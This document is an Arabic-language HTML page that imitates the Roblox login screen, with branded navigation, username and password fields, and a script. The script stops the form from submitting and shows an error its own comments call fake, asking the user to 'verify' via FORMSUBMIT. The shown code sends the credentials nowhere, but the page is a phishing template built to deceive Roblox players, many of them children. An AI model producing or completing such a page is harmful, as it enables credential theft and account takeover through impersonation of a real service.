<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>Roblox</title>

<style>
body{
  margin:0;
  font-family:Arial, sans-serif;
  background:#1c1f26;
  color:white;
}
.navbar{
  background:linear-gradient(#1a1a1a,#0f0f0f);
  height:64px;
  display:flex;
  align-items:center;
  padding:0 18px;
}
.logo{font-size:24px;font-weight:900;margin-right:20px;}
.links{display:flex;gap:18px;}
.links a{color:#ddd;text-decoration:none;font-size:14px;}
.links a:hover{color:white}
.search{
  margin:auto;
  display:flex;
  align-items:center;
  background:#222;
  border-radius:10px;
  padding:6px 14px;
  width:420px;
}
.search input{background:transparent;border:none;color:white;outline:none;width:100%;}
.actions{margin-left:auto;display:flex;gap:10px;}
.btn-blue,.btn-dark{width:120px;padding:8px 0;border-radius:8px;font-weight:bold;}
.btn-blue{background:#2a7cff;border:none;color:white;}
.btn-dark{background:#111;border:1px solid #555;color:white;}

.bg{
  background:url("IMG_0161.png") center/cover no-repeat;
  min-height:calc(100vh - 64px);
  display:flex;
  justify-content:center;
  align-items:center;
}

/* ===== Roblox Login Box ===== */
.box{
  background:#2b2f36;
  width:380px;
  padding:28px;
  border-radius:14px;
}

.box h2{
  text-align:center;
  font-size:22px;
  margin-bottom:18px;
}

.box input{
  width:100%;
  padding:14px;
  margin:12px 0;
  border-radius:10px;
  border:1px solid #555;
  background:#1f2329;
  color:white;
  font-size:15px;
}

.box input::placeholder{color:#aaa;}

.mainbtn{
  width:100%;
  padding:14px;
  border-radius:10px;
  border:1px solid #ccc;
  background:transparent;
  color:white;
  font-weight:bold;
  cursor:pointer;
}

.mainbtn:hover{background:#3a3f46;}

.line{height:1px;background:#444;margin:15px 0;}

.altbtn{
  width:100%;
  padding:12px;
  border-radius:10px;
  border:none;
  background:#3a3f46;
  color:white;
  font-weight:600;
  margin-top:10px;
  cursor:pointer;
}

.altbtn:hover{filter:brightness(1.1);}

.small{
  text-align:center;
  margin-top:14px;
  font-size:13px;
  color:#ccc;
}
.link{
  text-align:center;
  font-size:13px;
  color:#9db4ff;
  margin:12px 0;
  cursor:pointer;
}

/* رسالة الخطأ الوهمية */
.fake-alert{
  display:none;
  background:#ff4b4b;
  color:white;
  text-align:center;
  padding:12px;
  border-radius:10px;
  margin-bottom:12px;
  font-weight:bold;
}
</style>
</head>

<body>

<div class="navbar">
  <div class="logo">ROBLOX</div>
  <div class="links">
    <a href="#">الرئيسية</a>
    <a href="#">السوق</a>
    <a href="#">إنشاء</a>
    <a href="#">Robux</a>
  </div>
  <div class="search">
    <input type="text" placeholder="بحث">
  </div>
  <div class="actions">
    <button class="btn-blue">تسجيل الدخول</button>
    <button class="btn-dark">تسجيل</button>
  </div>
</div>

<div class="bg">
  <div class="box">
    <h2>تسجيل الدخول إلى Roblox</h2>

    <!-- رسالة الخطأ الوهمية -->
    <div id="fakeAlert" class="fake-alert">
      حصلت مشكلة، يرجى التحقق من أنك إنسان عبر تطبيق FORMSUBMIT
    </div>

    <form id="loginForm">
      <input type="text" name="Player_Name" placeholder="اسم المستخدم/البريد الإلكتروني" required>
      <input type="password" name="Player_Password" placeholder="كلمة المرور" required>

      <button type="submit" class="mainbtn">تسجيل الدخول</button>
    </form>

    <div class="link">نسيت كلمة المرور أو اسم المستخدم؟</div>

    <div class="line"></div>

    <button class="altbtn">إرسال رمز صالح لمرة واحدة عبر البريد الإلكتروني</button>
    <button class="altbtn">تسجيل دخول سريع</button>

    <div class="small">ليس لديك حساب؟ اشترك</div>
  </div>
</div>

<script>
// عند الضغط على تسجيل الدخول
document.getElementById("loginForm").addEventListener("submit", function(e){
  e.preventDefault(); // يمنع إرسال الفورم

  // اظهار رسالة الخطأ الوهمية
  var alertBox = document.getElementById("fakeAlert");
  alertBox.style.display = "block";

  // ممكن تختفي بعد 5 ثواني تلقائي
  setTimeout(function(){
    alertBox.style.display = "none";
  }, 5000);
});
</script>

</body>
</html>
